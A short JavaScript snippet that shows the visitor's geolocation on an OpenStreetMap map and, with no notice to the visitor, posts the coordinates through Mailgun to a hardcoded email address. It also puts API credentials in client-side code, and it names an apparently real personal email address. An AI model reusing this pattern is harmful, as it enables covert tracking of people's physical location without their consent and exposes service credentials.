// Get the current location of the device
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    console.log("Geolocation is not supported by this browser.");
  }
}

// Display the location on a map
function showPosition(position) {
  var latitude = position.coords.latitude;
  var longitude = position.coords.longitude;

  // Send the location to your email
  sendEmail(latitude, longitude);

  // Create a map
  var map = L.map('map').setView([latitude, longitude], 13);

  // Add a tile layer
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
  }).addTo(map);

  // Add a marker at the current location
  L.marker([latitude, longitude]).addTo(map);
}

// Send the location to your email
function sendEmail(latitude, longitude) {
  var email = 'msiyol9045@gmail.com';
  var subject = 'Location Update';
  var body = 'Latitude: ' + latitude + '\nLongitude: ' + longitude;

  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://api.mailgun.net/v3/YOUR-DOMAIN/messages', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.setRequestHeader('Authorization', 'Basic ' + btoa('api:YOUR-API-KEY'));
  xhr.send('from=' + encodeURIComponent(email) + '&to=' + encodeURIComponent(email) + '&subject=' + encodeURIComponent(subject) + '&text=' + encodeURIComponent(body));
}

// Get the location
getLocation();
